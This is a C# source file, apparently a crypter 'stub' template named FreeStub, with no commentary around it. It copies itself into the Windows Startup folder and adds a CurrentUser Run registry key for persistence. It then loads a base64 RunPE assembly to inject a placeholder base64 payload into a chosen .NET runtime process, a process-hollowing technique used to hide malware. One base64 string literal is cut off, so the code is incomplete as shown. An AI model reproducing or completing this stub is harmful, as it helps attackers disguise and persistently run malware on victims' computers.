using System;
using System.Text;
using System.Reflection;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace FreeStub
{
    class Class1
    {
        private static string InjectionProcess = "%Process%";

        private static string DropToStartup = "%Startup%";
        private static string StartupFilename = "%Filename%";

        private static string RegistryStartup = "%Registry%";
        private static string RegistryName = "%RegName%";

        static void Main()
        {
            InstallPayload();
            Thread.Sleep(2000);
            byte[] Runpe = Convert.FromBase64String("
            byte[] Payload = Convert.FromBase64String("%PayloadBase64%");
            Assembly RunpeLoader = Assembly.Load(Runpe);
            object[] Params = new object[] { Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), InjectionProcess), Payload };
            RunpeLoader.GetType("NyanRunpe.WorkingClass").GetMethod("Execute").Invoke(null, Params);
        }

        private static void InstallPayload()
        {
            if (DropToStartup == "True")
            {
                string DestinationPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + StartupFilename; 
                File.Copy(Application.ExecutablePath, DestinationPath, true);
            }

            if (RegistryStartup == "True")
            {
                RegistryKey RegKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                RegKey.SetValue(RegistryName, Application.ExecutablePath, RegistryValueKind.String);
            }
        }
    }
}